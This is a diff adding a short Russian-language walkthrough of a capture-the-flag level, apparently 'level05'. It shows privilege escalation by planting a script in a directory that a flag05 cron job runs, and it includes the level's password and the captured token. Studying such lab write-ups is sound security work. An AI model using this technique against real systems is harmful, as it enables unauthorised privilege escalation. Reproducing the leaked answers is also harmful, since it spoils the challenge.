@@ -1,0 +1,24 @@
+su level05
+pass: ne2searoevaevoem4ov4ar8ap
+
+Поиск по имени
+find / -name level05  2>/dev/null
+
+Находим, проверяем содержимое
+cat /var/mail/level05
+Видим, что работает Crontab, который запускает скрипт openarenaserver от пользователя flag05
+
+Поиск по пользователю flag05
+find / -user flag05  2>/dev/null
+
+Нашли, проверяем содержимое
+cat /usr/sbin/openarenaserver
+
+Видим, что скрипт выполняет все, что лежит в папке /opt/openarenaserver/ в течении 5 секунд, затем удаляет,
+значит мы с помощью символический ссылок подставляем туда getflag
+
+echo "getflag > /tmp/token" > /tmp/getflag.sh
+mv /tmp/getflag.sh /opt/openarenaserver/getflag.sh
+
+cat /tmp/token
+Check flag.Here is your token : viuaaale9huek52boumoomioc
